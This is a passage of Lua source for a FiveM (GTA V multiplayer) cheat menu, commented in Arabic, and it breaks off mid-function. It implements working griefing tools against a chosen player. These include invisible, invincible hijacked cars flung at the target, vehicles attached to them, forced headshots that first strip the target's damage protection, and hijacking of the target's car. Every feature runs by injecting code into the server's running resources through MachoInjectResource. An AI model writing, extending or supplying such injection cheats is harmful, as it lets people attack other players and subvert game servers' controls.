                                                    SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                                    SetEntityHeading(playerPed, originalHeading)
                                                    SetEntityVisible(playerPed, true, false)
                                                    
                                                    -- الآن جذب السيارة
                                                    local direction = targetPos - vehiclePos
                                                    direction = direction / #direction
                                                    local force = 80.0
                                                    local velocity = direction * force
                                                    SetEntityVelocity(vehicle, velocity.x, velocity.y, velocity.z)
                                                end
                                                -- إذا فيها قائد - تجنبها (مافي كود)
                                            end
                                        end
                                    end
                                    success, vehicle = FindNextVehicle(handle)
                                until not success
                                EndFindVehicle(handle)
                            end
                            
                            Citizen.Wait(100) -- تحديث كل 100 مللي ثانية للحصول على تأثير سلس
                        end
                    end)
                ]])
                MachoMenuNotification("Black Hole", "Black Hole activated on Player ID: " .. GetPlayerServerId(selectedPlayer))
            else
                MachoMenuNotification("Error", "Player not found")
            end
        else
            MachoMenuNotification("Error", "No player selected")
        end
    end,
    function()
        enableBlackHole = false
        MachoInjectResource("any", [[
            blackHoleActive = false
        ]])
        MachoMenuNotification("Black Hole", "Black Hole deactivated")
    end
)
MachoMenuCheckbox(PlayerSection, "Attach Vehicles", 
    function()
        enableAttach = true
        local selectedPlayer = MachoMenuGetSelectedPlayer()  
        if selectedPlayer and selectedPlayer ~= -1 then      
            local targetPed = GetPlayerPed(selectedPlayer)   
            if targetPed and DoesEntityExist(targetPed) then
                local originalTargetPlayer = selectedPlayer
                
                MachoInjectResource("any", [[
                    attachActive = true
                    originalTargetPlayer = ]] .. originalTargetPlayer .. [[
                    attachedVehicles = {}
                    
                    Citizen.CreateThread(function()
                        local targetPed = GetPlayerPed(originalTargetPlayer)
                        -- التأكد من وجود الشخص المحدد فقط
                        if DoesEntityExist(targetPed) then
                            local targetPos = GetEntityCoords(targetPed)
                            
                            -- البحث عن جميع السيارات في نطاق 200 متر
                            local handle, vehicle = FindFirstVehicle()
                            local success
                            repeat
                                if DoesEntityExist(vehicle) then
                                    local vehiclePos = GetEntityCoords(vehicle)
                                    local distance = #(targetPos - vehiclePos)
                                    
                                    if distance < 400.0 and distance > 2.0 then -- تجنب السيارات القريبة جداً
                                        -- فحص الصلاحية على السيارة
                                        NetworkRequestControlOfEntity(vehicle)
                                        local hasControl = NetworkHasControlOfEntity(vehicle)
                                        
                                        if hasControl then
                                            -- عنده صلاحية - عمل attach في نفس مكان الشخص
                                            AttachEntityToEntity(
                                                vehicle, targetPed, 0,
                                                0.0, 0.0, 0.0, -- نفس مكان الشخص بالضبط
                                                0.0, 0.0, 0.0,
                                                false, false, true, false, 2, true
                                            )
                                            table.insert(attachedVehicles, vehicle)
                                        else
                                            -- ماعنده صلاحية - فحص إذا السيارة فارغة
                                            local isVehicleEmpty = true
                                            local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(vehicle)) - 1
                                            
                                            for seat = -1, maxSeats do
                                                local pedInSeat = GetPedInVehicleSeat(vehicle, seat)
                                                if pedInSeat ~= 0 then
                                                    local playerId = NetworkGetPlayerIndexFromPed(pedInSeat)
                                                    if playerId ~= -1 then
                                                        isVehicleEmpty = false
                                                        break
                                                    end
                                                end
                                            end
                                            
                                            if isVehicleEmpty then
                                                -- السيارة فارغة - وارب سريع للحصول على الصلاحية
                                                local playerPed = PlayerPedId()
                                                local originalPos = GetEntityCoords(playerPed)
                                                local originalHeading = GetEntityHeading(playerPed)
                                                
                                                SetEntityVisible(playerPed, false, false)
                                                ClearPedTasksImmediately(playerPed)
                                                TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                                ClearPedTasksImmediately(playerPed)
                                                TaskLeaveVehicle(playerPed, vehicle, 0)
                                                SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                                SetEntityHeading(playerPed, originalHeading)
                                                SetEntityVisible(playerPed, true, false)
                                                
                                                -- الآن عمل attach للسيارة في نفس مكان الشخص
                                                AttachEntityToEntity(
                                                    vehicle, targetPed, 0,
                                                    0.0, 0.0, 0.0, -- نفس مكان الشخص بالضبط
                                                    0.0, 0.0, 0.0,
                                                    false, false, true, false, 2, true
                                                )
                                                table.insert(attachedVehicles, vehicle)
                                            end
                                            -- إذا فيها قائد - تجنبها (مافي كود)
                                        end
                                    end
                                end
                                success, vehicle = FindNextVehicle(handle)
                            until not success
                            EndFindVehicle(handle)
                        end
                    end)
                ]])
                MachoMenuNotification("Attach", "Vehicle attach activated on Player ID: " .. GetPlayerServerId(selectedPlayer))
            else
                MachoMenuNotification("Error", "Player not found")
            end
        else
            MachoMenuNotification("Error", "No player selected")
        end
    end,
    function()
        enableAttach = false
        MachoInjectResource("any", [[
            attachActive = false
            -- فصل جميع السيارات المرفقة
            for i, vehicle in ipairs(attachedVehicles) do
                if DoesEntityExist(vehicle) then
                    DetachEntity(vehicle, true, true)
                end
            end
            attachedVehicles = {}
        ]])
        MachoMenuNotification("Attach", "Vehicle attach deactivated - All vehicles detached")
    end
)
MachoMenuCheckbox(PlayerSection, "Annoy Player", 
    function()
        enableBlackHole = true
        local selectedPlayer = MachoMenuGetSelectedPlayer()  
        if selectedPlayer and selectedPlayer ~= -1 then      
            local targetPed = GetPlayerPed(selectedPlayer)   
            if targetPed and DoesEntityExist(targetPed) then
                local originalTargetPlayer = selectedPlayer
                
                MachoInjectResource("any", [[
                    blackHoleActive = true
                    blackHoleVehicle = nil
                    originalTargetPlayer = ]] .. originalTargetPlayer .. [[
                    teleportCooldown = 0
                    
                    Citizen.CreateThread(function()
                        -- البحث عن سيارة واحدة فقط
                        while blackHoleActive and not blackHoleVehicle do
                            local targetPed = GetPlayerPed(originalTargetPlayer)
                            if DoesEntityExist(targetPed) then
                                local targetPos = GetEntityCoords(targetPed)
                                
                                -- البحث عن أول سيارة مناسبة في نطاق 400 متر
                                local handle, vehicle = FindFirstVehicle()
                                local success
                                repeat
                                    if DoesEntityExist(vehicle) then
                                        local vehiclePos = GetEntityCoords(vehicle)
                                        local distance = #(targetPos - vehiclePos)
                                        
                                        if distance < 400.0 and distance > 2.0 then
                                            -- فحص الصلاحية على السيارة
                                            NetworkRequestControlOfEntity(vehicle)
                                            local hasControl = NetworkHasControlOfEntity(vehicle)
                                            
                                            if hasControl then
                                                -- عنده صلاحية - استخدم هذه السيارة
                                                blackHoleVehicle = vehicle
                                                break
                                            else
                                                -- ماعنده صلاحية - فحص إذا السيارة فارغة
                                                local isVehicleEmpty = true
                                                local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(vehicle)) - 1
                                                
                                                for seat = -1, maxSeats do
                                                    local pedInSeat = GetPedInVehicleSeat(vehicle, seat)
                                                    if pedInSeat ~= 0 then
                                                        local playerId = NetworkGetPlayerIndexFromPed(pedInSeat)
                                                        if playerId ~= -1 then
                                                            isVehicleEmpty = false
                                                            break
                                                        end
                                                    end
                                                end
                                                
                                                if isVehicleEmpty then
                                                    -- السيارة فارغة - وارب سريع للحصول على التحكم
                                                    local playerPed = PlayerPedId()
                                                    local originalPos = GetEntityCoords(playerPed)
                                                    local originalHeading = GetEntityHeading(playerPed)
                                                    
                                                    SetEntityVisible(playerPed, false, false)
                                                    ClearPedTasksImmediately(playerPed)
                                                    TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                                    ClearPedTasksImmediately(playerPed)
                                                    TaskLeaveVehicle(playerPed, vehicle, 0)
                                                    SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                                    SetEntityHeading(playerPed, originalHeading)
                                                    SetEntityVisible(playerPed, true, false)
                                                    
                                                    -- الآن استخدم هذه السيارة
                                                    blackHoleVehicle = vehicle
                                                    break
                                                end
                                            end
                                        end
                                    end
                                    success, vehicle = FindNextVehicle(handle)
                                until not success
                                EndFindVehicle(handle)
                            end
                            
                            Citizen.Wait(1000) -- انتظار ثانية قبل البحث مرة أخرى
                        end
                        
                        -- إذا تم العثور على سيارة، ابدأ الـ Black Hole
                        if blackHoleVehicle and DoesEntityExist(blackHoleVehicle) then
                            -- جعل السيارة مخفية
                            SetEntityVisible(blackHoleVehicle, false, false)
                            SetEntityAlpha(blackHoleVehicle, 0, false)
                            NetworkSetEntityInvisibleToNetwork(blackHoleVehicle, true)
                            
                            -- جعل السيارة غير قابلة للتخريب
                            SetEntityInvincible(blackHoleVehicle, true)
                            SetVehicleCanBreak(blackHoleVehicle, false)
                            SetVehicleCanBeVisiblyDamaged(blackHoleVehicle, false)
                            SetVehicleCanEngineOperateOnFire(blackHoleVehicle, true)
                            SetVehicleCanLeakOil(blackHoleVehicle, false)
                            SetVehicleCanLeakPetrol(blackHoleVehicle, false)
                            SetVehicleWheelsCanBreak(blackHoleVehicle, false)
                            SetVehicleWheelsCanBreakOffWhenBlowUp(blackHoleVehicle, false)
                            SetVehicleHasUnbreakableLights(blackHoleVehicle, true)
                            SetVehicleCanDeformWheels(blackHoleVehicle, false)
                            -- SetVehicleCanBeDamaged غير متوفر في FiveM
                            SetEntityCanBeDamaged(blackHoleVehicle, false)
                            
                            -- منع التفجير والانفجار
                            SetEntityProofs(blackHoleVehicle, true, true, true, true, true, true, true, true)
                            SetVehicleStrong(blackHoleVehicle, true)
                            SetVehicleCanBeTargetted(blackHoleVehicle, false)
                            SetEntityCanBeDamagedByRelationshipGroup(blackHoleVehicle, false, 0)
                            
                            -- جعل الصدمات صامتة عبر إعدادات الفيزياء
                            SetVehicleGravityAmount(blackHoleVehicle, 0.0)
                            SetEntityCollision(blackHoleVehicle, true, false) -- collision بدون أصوات
                            SetEntityRecordsCollisions(blackHoleVehicle, false)
                            
                            -- منع حذف السيارة
                            SetEntityAsMissionEntity(blackHoleVehicle, true, true)
                            SetVehicleHasBeenOwnedByPlayer(blackHoleVehicle, true)
                            SetEntityAsNoLongerNeeded(blackHoleVehicle)
                            FreezeEntityPosition(blackHoleVehicle, false)
                            SetVehicleOnGroundProperly(blackHoleVehicle)
                            
                            -- جعل السيارة صامتة (استخدام دوال أساسية فقط)
                            SetVehicleEngineOn(blackHoleVehicle, true, true, false)
                            SetVehicleRadioEnabled(blackHoleVehicle, false)
                            SetVehicleLights(blackHoleVehicle, 0)
                            SetVehicleSiren(blackHoleVehicle, false)
                            -- إزالة جميع الدوال غير المتوفرة في FiveM
                            
                            -- حلقة الـ Black Hole مع النقل والجذب
                            while blackHoleActive and DoesEntityExist(blackHoleVehicle) do
                                local targetPed = GetPlayerPed(originalTargetPlayer)
                                
                                if DoesEntityExist(targetPed) then
                                    local targetPos = GetEntityCoords(targetPed)
                                    local vehiclePos = GetEntityCoords(blackHoleVehicle)
                                    local distance = #(targetPos - vehiclePos)
                                    
                                    -- التأكد من بقاء السيارة مخفية ومحمية
                                    SetEntityVisible(blackHoleVehicle, false, false)
                                    SetEntityAlpha(blackHoleVehicle, 0, false)
                                    
                                    -- إعادة تطبيق الحماية باستمرار
                                    SetEntityInvincible(blackHoleVehicle, true)
                                    SetEntityCanBeDamaged(blackHoleVehicle, false)
                                    SetEntityProofs(blackHoleVehicle, true, true, true, true, true, true, true, true)
                                    SetEntityAsMissionEntity(blackHoleVehicle, true, true)
                                    
                                    -- التأكد من عدم الحذف
                                    if not DoesEntityExist(blackHoleVehicle) then
                                        break -- إذا تم حذف السيارة، إنهاء الحلقة
                                    end
                                    
                                    -- نظام النقل والجذب
                                    if teleportCooldown <= 0 then
                                        -- المرحلة الأولى: نقل السيارة فوق الهدف (ليس تحته)
                                        local teleportPos = vector3(targetPos.x, targetPos.y, targetPos.z + 10.0) -- فوق الهدف بـ 10 متر
                                        SetEntityCoordsNoOffset(blackHoleVehicle, teleportPos.x, teleportPos.y, teleportPos.z, false, false, false)
                                        SetEntityVelocity(blackHoleVehicle, 0.0, 0.0, 0.0)
                                        
                                        -- بدء عداد الجذب
                                        teleportCooldown = 15 -- 15 إطار للجذب (حوالي 1.5 ثانية)
                                    else
                                        -- المرحلة الثانية: جذب السيارة نحو الهدف بسرعة عالية
                                        local currentVehiclePos = GetEntityCoords(blackHoleVehicle)
                                        local direction = targetPos - currentVehiclePos
                                        local normalizedDirection = direction / #direction
                                        
                                        -- قوة جذب عالية جداً
                                        local pullForce = 200.0
                                        local velocity = normalizedDirection * pullForce
                                        
                                        -- تطبيق السرعة
                                        SetEntityVelocity(blackHoleVehicle, velocity.x, velocity.y, velocity.z)
                                        
                                        -- تقليل العداد
                                        teleportCooldown = teleportCooldown - 1
                                        
                                        -- إذا انتهى العداد، إعادة تعيين للنقل مرة أخرى
                                        if teleportCooldown <= 0 then
                                            teleportCooldown = 0
                                        end
                                    end
                                else
                                    -- إذا لم يوجد الهدف، انتظار ولكن استمرار الحلقة
                                    Citizen.Wait(1000)
                                end
                                
                                Citizen.Wait(50) -- تحديث كل 50 مللي ثانية للحصول على سرعة أعلى
                            end
                            
                            -- تنظيف عند إنهاء الحلقة
                            if DoesEntityExist(blackHoleVehicle) then
                                SetEntityAsMissionEntity(blackHoleVehicle, false, false)
                                DeleteEntity(blackHoleVehicle)
                            end
                        end
                    end)
                ]])
                MachoMenuNotification("Black Hole", "Black Hole activated on Player ID: " .. GetPlayerServerId(selectedPlayer))
            else
                MachoMenuNotification("Error", "Player not found")
            end
        else
            MachoMenuNotification("Error", "No player selected")
        end
    end,
    function()
        enableBlackHole = false
        MachoInjectResource("any", [[
            blackHoleActive = false
            blackHoleVehicle = nil
            teleportCooldown = 0
        ]])
        MachoMenuNotification("Black Hole", "Black Hole deactivated")
    end
)
MachoMenuCheckbox(PlayerSection, "Glitch Player", 
    function()
        enableBlackHole = true
        local selectedPlayer = MachoMenuGetSelectedPlayer()  
        if selectedPlayer and selectedPlayer ~= -1 then      
            local targetPed = GetPlayerPed(selectedPlayer)   
            if targetPed and DoesEntityExist(targetPed) then
                local originalTargetPlayer = selectedPlayer
                
                MachoInjectResource("any", [[
                    blackHoleActive = true
                    blackHoleVehicle = nil
                    originalTargetPlayer = ]] .. originalTargetPlayer .. [[
                    teleportCooldown = 0
                    
                    Citizen.CreateThread(function()
                        -- البحث عن سيارة واحدة فقط
                        while blackHoleActive and not blackHoleVehicle do
                            local targetPed = GetPlayerPed(originalTargetPlayer)
                            if DoesEntityExist(targetPed) then
                                local targetPos = GetEntityCoords(targetPed)
                                
                                -- البحث عن أول سيارة مناسبة في نطاق 400 متر
                                local handle, vehicle = FindFirstVehicle()
                                local success
                                repeat
                                    if DoesEntityExist(vehicle) then
                                        local vehiclePos = GetEntityCoords(vehicle)
                                        local distance = #(targetPos - vehiclePos)
                                        
                                        if distance < 400.0 and distance > 2.0 then
                                            -- فحص الصلاحية على السيارة
                                            NetworkRequestControlOfEntity(vehicle)
                                            local hasControl = NetworkHasControlOfEntity(vehicle)
                                            
                                            if hasControl then
                                                -- عنده صلاحية - استخدم هذه السيارة
                                                blackHoleVehicle = vehicle
                                                break
                                            else
                                                -- ماعنده صلاحية - فحص إذا السيارة فارغة
                                                local isVehicleEmpty = true
                                                local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(vehicle)) - 1
                                                
                                                for seat = -1, maxSeats do
                                                    local pedInSeat = GetPedInVehicleSeat(vehicle, seat)
                                                    if pedInSeat ~= 0 then
                                                        local playerId = NetworkGetPlayerIndexFromPed(pedInSeat)
                                                        if playerId ~= -1 then
                                                            isVehicleEmpty = false
                                                            break
                                                        end
                                                    end
                                                end
                                                
                                                if isVehicleEmpty then
                                                    -- السيارة فارغة - وارب سريع للحصول على التحكم
                                                    local playerPed = PlayerPedId()
                                                    local originalPos = GetEntityCoords(playerPed)
                                                    local originalHeading = GetEntityHeading(playerPed)
                                                    
                                                    SetEntityVisible(playerPed, false, false)
                                                    ClearPedTasksImmediately(playerPed)
                                                    TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                                    ClearPedTasksImmediately(playerPed)
                                                    TaskLeaveVehicle(playerPed, vehicle, 0)
                                                    SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                                    SetEntityHeading(playerPed, originalHeading)
                                                    SetEntityVisible(playerPed, true, false)
                                                    
                                                    -- الآن استخدم هذه السيارة
                                                    blackHoleVehicle = vehicle
                                                    break
                                                end
                                            end
                                        end
                                    end
                                    success, vehicle = FindNextVehicle(handle)
                                until not success
                                EndFindVehicle(handle)
                            end
                            
                            Citizen.Wait(1000) -- انتظار ثانية قبل البحث مرة أخرى
                        end
                        
                        -- إذا تم العثور على سيارة، ابدأ الـ Black Hole
                        if blackHoleVehicle and DoesEntityExist(blackHoleVehicle) then
                            -- جعل السيارة مخفية
                            SetEntityVisible(blackHoleVehicle, false, false)
                            SetEntityAlpha(blackHoleVehicle, 0, false)
                            NetworkSetEntityInvisibleToNetwork(blackHoleVehicle, true)
                            
                            -- جعل السيارة غير قابلة للتخريب
                            SetEntityInvincible(blackHoleVehicle, true)
                            SetVehicleCanBreak(blackHoleVehicle, false)
                            SetVehicleCanBeVisiblyDamaged(blackHoleVehicle, false)
                            SetVehicleCanEngineOperateOnFire(blackHoleVehicle, true)
                            SetVehicleCanLeakOil(blackHoleVehicle, false)
                            SetVehicleCanLeakPetrol(blackHoleVehicle, false)
                            SetVehicleWheelsCanBreak(blackHoleVehicle, false)
                            SetVehicleWheelsCanBreakOffWhenBlowUp(blackHoleVehicle, false)
                            SetVehicleHasUnbreakableLights(blackHoleVehicle, true)
                            SetVehicleCanDeformWheels(blackHoleVehicle, false)
                            -- SetVehicleCanBeDamaged غير متوفر في FiveM
                            SetEntityCanBeDamaged(blackHoleVehicle, false)
                            
                            -- منع التفجير والانفجار
                            SetEntityProofs(blackHoleVehicle, true, true, true, true, true, true, true, true)
                            SetVehicleStrong(blackHoleVehicle, true)
                            SetVehicleCanBeTargetted(blackHoleVehicle, false)
                            SetEntityCanBeDamagedByRelationshipGroup(blackHoleVehicle, false, 0)
                            
                            -- جعل الصدمات صامتة عبر إعدادات الفيزياء
                            SetVehicleGravityAmount(blackHoleVehicle, 0.0)
                            SetEntityCollision(blackHoleVehicle, true, false) -- collision بدون أصوات
                            SetEntityRecordsCollisions(blackHoleVehicle, false)
                            
                            -- منع حذف السيارة
                            SetEntityAsMissionEntity(blackHoleVehicle, true, true)
                            SetVehicleHasBeenOwnedByPlayer(blackHoleVehicle, true)
                            SetEntityAsNoLongerNeeded(blackHoleVehicle)
                            FreezeEntityPosition(blackHoleVehicle, false)
                            SetVehicleOnGroundProperly(blackHoleVehicle)
                            
                            -- جعل السيارة صامتة (استخدام دوال أساسية فقط)
                            SetVehicleEngineOn(blackHoleVehicle, true, true, false)
                            SetVehicleRadioEnabled(blackHoleVehicle, false)
                            SetVehicleLights(blackHoleVehicle, 0)
                            SetVehicleSiren(blackHoleVehicle, false)
                            -- إزالة جميع الدوال غير المتوفرة في FiveM
                            
                            -- حلقة الـ Black Hole مع النقل والجذب
                            while blackHoleActive and DoesEntityExist(blackHoleVehicle) do
                                local targetPed = GetPlayerPed(originalTargetPlayer)
                                
                                if DoesEntityExist(targetPed) then
                                    local targetPos = GetEntityCoords(targetPed)
                                    local vehiclePos = GetEntityCoords(blackHoleVehicle)
                                    local distance = #(targetPos - vehiclePos)
                                    
                                    -- التأكد من بقاء السيارة مخفية ومحمية
                                    SetEntityVisible(blackHoleVehicle, false, false)
                                    SetEntityAlpha(blackHoleVehicle, 0, false)
                                    
                                    -- إعادة تطبيق الحماية باستمرار
                                    SetEntityInvincible(blackHoleVehicle, true)
                                    SetEntityCanBeDamaged(blackHoleVehicle, false)
                                    SetEntityProofs(blackHoleVehicle, true, true, true, true, true, true, true, true)
                                    SetEntityAsMissionEntity(blackHoleVehicle, true, true)
                                    
                                    -- التأكد من عدم الحذف
                                    if not DoesEntityExist(blackHoleVehicle) then
                                        break -- إذا تم حذف السيارة، إنهاء الحلقة
                                    end
                                    
                                    -- نظام النقل والجذب المحسن
                                    if teleportCooldown <= 0 then
                                        -- المرحلة الأولى: نقل السيارة في موقع عشوائي حول الهدف
                                        local randomOffset = math.random(15, 25) -- مسافة عشوائية بين 15-25 متر
                                        local randomAngle = math.random() * 2 * math.pi -- زاوية عشوائية
                                        
                                        local teleportPos = vector3(
                                            targetPos.x + math.cos(randomAngle) * randomOffset,
                                            targetPos.y + math.sin(randomAngle) * randomOffset,
                                            targetPos.z + math.random(5, 15) -- ارتفاع عشوائي بين 5-15 متر
                                        )
                                        
                                        SetEntityCoordsNoOffset(blackHoleVehicle, teleportPos.x, teleportPos.y, teleportPos.z, false, false, false)
                                        SetEntityVelocity(blackHoleVehicle, 0.0, 0.0, 0.0)
                                        
                                        -- بدء عداد الجذب - وقت أطول للجذب
                                        teleportCooldown = 60 -- 60 إطار للجذب (حوالي 4 ثوان)
                                    else
                                        -- المرحلة الثانية: جذب السيارة نحو الهدف بسرعة معتدلة
                                        local currentVehiclePos = GetEntityCoords(blackHoleVehicle)
                                        local direction = targetPos - currentVehiclePos
                                        local distance = #direction
                                        
                                        if distance > 1.0 then -- تجنب القسمة على صفر
                                            local normalizedDirection = direction / distance
                                            
                                            -- قوة جذب معتدلة تزيد كلما اقتربت السيارة
                                            local basePullForce = 25.0 -- قوة أساسية أقل
                                            local distanceMultiplier = math.max(0.5, 30.0 / distance) -- تزيد القوة مع القرب
                                            local pullForce = basePullForce * distanceMultiplier
                                            
                                            local velocity = normalizedDirection * pullForce
                                            
                                            -- تطبيق السرعة
                                            SetEntityVelocity(blackHoleVehicle, velocity.x, velocity.y, velocity.z)
                                        end
                                        
                                        -- تقليل العداد
                                        teleportCooldown = teleportCooldown - 1
                                        
                                        -- إذا انتهى العداد، إعادة تعيين للنقل مرة أخرى
                                        if teleportCooldown <= 0 then
                                            teleportCooldown = 0
                                        end
                                    end
                                else
                                    -- إذا لم يوجد الهدف، انتظار ولكن استمرار الحلقة
                                    Citizen.Wait(1000)
                                end
                                
                                Citizen.Wait(100) -- تحديث كل 100 مللي ثانية لسرعة أبطأ
                            end
                            
                            -- تنظيف عند إنهاء الحلقة
                            if DoesEntityExist(blackHoleVehicle) then
                                SetEntityAsMissionEntity(blackHoleVehicle, false, false)
                                DeleteEntity(blackHoleVehicle)
                            end
                        end
                    end)
                ]])
                MachoMenuNotification("Black Hole", "Black Hole activated on Player ID: " .. GetPlayerServerId(selectedPlayer))
            else
                MachoMenuNotification("Error", "Player not found")
            end
        else
            MachoMenuNotification("Error", "No player selected")
        end
    end,
    function()
        enableBlackHole = false
        MachoInjectResource("any", [[
            blackHoleActive = false
            blackHoleVehicle = nil
            teleportCooldown = 0
        ]])
        MachoMenuNotification("Black Hole", "Black Hole deactivated")
    end
)
MachoMenuButton(PlayerSection, "Headshot Kill", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()
    
    if not selectedPlayer then
        MachoMenuNotification("Error", "No player selected! Select a player from the list first.")
        return
    end
    
    local targetPed = GetPlayerPed(selectedPlayer)
    if not DoesEntityExist(targetPed) then
        MachoMenuNotification("Error", "Target player not found!")
        return
    end
    
    MachoInjectResource("any", [[
        Citizen.CreateThread(function()
            local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
            local myPed = PlayerPedId()
            local currentWeapon = GetSelectedPedWeapon(myPed)
            
            -- التحقق من أن اللاعب يحمل سلاح
            if currentWeapon and currentWeapon ~= GetHashKey("weapon_unarmed") then
                if DoesEntityExist(targetPed) then
                    -- إزالة الحماية من الهدف
                    SetEntityInvincible(targetPed, false)
                    SetEntityCanBeDamaged(targetPed, true)
                    SetEntityProofs(targetPed, false, false, false, false, false, false, false, false)
                    
                    -- الحصول على إحداثيات الرأس بطريقة أدق
                    local headBone = GetPedBoneIndex(targetPed, 31086)
                    local headCoords = GetWorldPositionOfEntityBone(targetPed, headBone)
                    
                    -- إذا لم نحصل على إحداثيات الرأس، استخدم الموقع العادي مع إضافة ارتفاع
                    if headCoords.x == 0.0 and headCoords.y == 0.0 and headCoords.z == 0.0 then
                        local targetPos = GetEntityCoords(targetPed)
                        headCoords = vector3(targetPos.x, targetPos.y, targetPos.z + 0.6)
                    end
                    
                    -- الحصول على ضرر السلاح الحالي
                    local weaponDamage = GetWeaponDamage(currentWeapon, 0)
                    
                    -- إزالة الارتداد
                    SetWeaponRecoilShakeAmplitude(currentWeapon, 0.0)
                    SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
                    
                    -- الطلقة الأولى من جانب الرأس الأيمن
                    local shootPos1 = vector3(headCoords.x + 1.5, headCoords.y, headCoords.z)
                    ShootSingleBulletBetweenCoords(
                        shootPos1.x, shootPos1.y, shootPos1.z,
                        headCoords.x, headCoords.y, headCoords.z,
                        weaponDamage, -- استخدام ضرر السلاح الحالي
                        true, -- perfectAccuracy
                        currentWeapon, -- استخدام السلاح الحالي
                        myPed,
                        true, -- isAudible
                        true, -- isInvisible (مخفية)
                        3000.0 -- speed عالية
                    )
                    
                    Citizen.Wait(50) -- انتظار قصير بين الطلقتين
                    
                    -- الطلقة الثانية من جانب الرأس الأيسر
                    local shootPos2 = vector3(headCoords.x - 1.5, headCoords.y, headCoords.z)
                    ShootSingleBulletBetweenCoords(
                        shootPos2.x, shootPos2.y, shootPos2.z,
                        headCoords.x, headCoords.y, headCoords.z,
                        weaponDamage, -- استخدام ضرر السلاح الحالي
                        true, -- perfectAccuracy
                        currentWeapon, -- استخدام السلاح الحالي
                        myPed,
                        true, -- isAudible
                        true, -- isInvisible (مخفية)
                        3000.0 -- speed عالية
                    )
                else
                    -- إشعار إذا لم يتم العثور على الهدف
                end
            else
                -- إشعار إذا لم يكن يحمل سلاح
            end
        end)
    ]])
    
    local targetName = GetPlayerName(selectedPlayer)
    MachoMenuNotification("Headshot", "Headshots fired at " .. targetName .. " using your current weapon")
end)

MachoMenuText(PlayerSection,"Vehicle Trolls")
-- Define DUI variables in a wider scope for accessibility
local menuDUI = nil
local menuVisible = false
local HELP_URL = "https://nitwit123.github.io/carauction/"

-- Use MachoMenuCheckbox with two callbacks: one for enabling, one for disabling.
MachoMenuCheckbox(PlayerSection, "Remote Car", 
    -- CallbackEnabled: This code runs when the checkbox is selected (enabling remote control)
    function()
        local selectedPlayer = MachoMenuGetSelectedPlayer()
        
        if selectedPlayer and selectedPlayer ~= -1 then
            local targetPed = GetPlayerPed(selectedPlayer)
            
            if targetPed and DoesEntityExist(targetPed) then
                local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                
                if targetVehicle ~= 0 then
                    local playerPed = PlayerPedId()
                    ClearPedTasksImmediately(playerPed)

                    local originalPos = GetEntityCoords(playerPed)
                    local originalHeading = GetEntityHeading(playerPed)

                    local targetResource = nil
                    local resourcePriority = {"any", "any", "any"}
                    local foundResources = {}
                    for _, resourceName in ipairs(resourcePriority) do
                        if GetResourceState(resourceName) == "started" then
                            table.insert(foundResources, resourceName)
                        end
                    end
                    
                    if #foundResources > 0 then
                        targetResource = foundResources[math.random(1, #foundResources)]
                    else
                        local allResources = {}
                        for i = 0, GetNumResources() - 1 do
                            local resourceName = GetResourceByFindIndex(i)
                            if resourceName and GetResourceState(resourceName) == "started" then
                                table.insert(allResources, resourceName)
                            end
                        end
                        if #allResources > 0 then
                            targetResource = allResources[math.random(1, #allResources)]
                        end
                    end

                    if targetResource then
                        -- Create the help menu (DUI) on the local player's machine.
                        if not GetCurrentResourceName then
                            return
                        end
                        
                        menuDUI = MachoCreateDui(HELP_URL)
                        if not menuDUI then
                            MachoMenuNotification("Remote Car", "Failed to create help menu.")
                            return
                        end
                        Citizen.Wait(1000)
                        MachoShowDui(menuDUI)
                        menuVisible = true
                        
                        -- Loop to handle showing/hiding the menu.
                        Citizen.CreateThread(function()
                            while menuDUI do
                                Citizen.Wait(0)
                                if IsControlJustPressed(0, 167) then -- You can change the open button
                                    menuVisible = not menuVisible
                                    if menuVisible then
                                        MachoShowDui(menuDUI)
                                    else
                                        MachoHideDui(menuDUI)
                                    end
                                end
                            end
                        end)
                        
                        -- Inject the remote control logic into the target resource.
                        MachoInjectResource("any", [[
                        Citizen.CreateThread(function()
                            local playerPed = PlayerPedId()
                            local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                            local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                            local originalHeading = ]] .. originalHeading .. [[

                            if targetVehicle ~= 0 then
                                SetVehicleDoorsLocked(targetVehicle, 1)
                                SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)

                                SetEntityVisible(playerPed, false, false)

                                TaskLeaveVehicle(targetPed, targetVehicle, 0)

                                SetPedMoveRateOverride(playerPed, 10.0)

                                ClearPedTasks(playerPed)
                                SetVehicleForwardSpeed(targetVehicle, 0.0)

                                TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)

                                -- إضافة حلقة انتظار للحصول على التحكم بالمركبة
                                local hasControl = false
                                local timeout = 0
                                while not hasControl and timeout < 200 do
                                    Citizen.Wait(10)
                                    if NetworkHasControlOfEntity(targetVehicle) then
                                        hasControl = true
                                    else
                                        NetworkRequestControlOfEntity(targetVehicle)
                                    end
                                    timeout = timeout + 1
                                end

                                if not hasControl then
                                    MachoMenuNotification("Remote Car", "Failed to get control of the vehicle. Aborting.")
                                    SetEntityVisible(playerPed, true, false)
                                    return
                                end
                                
                                -- ⭐️ إضافة فترة انتظار مدتها ثانيتان بعد الحصول على الصلاحية ⭐️
                                Citizen.Wait(600)

                                local keepHidden = true
                                Citizen.CreateThread(function()
                                    while keepHidden do
                                        SetEntityVisible(playerPed, false, false)
                                        Citizen.Wait(10)
                                    end
                                end)

                                Citizen.Wait(500)
                                keepHidden = false

                                ClearPedTasksImmediately(playerPed)

                                SetEntityAsMissionEntity(playerPed, true, true)

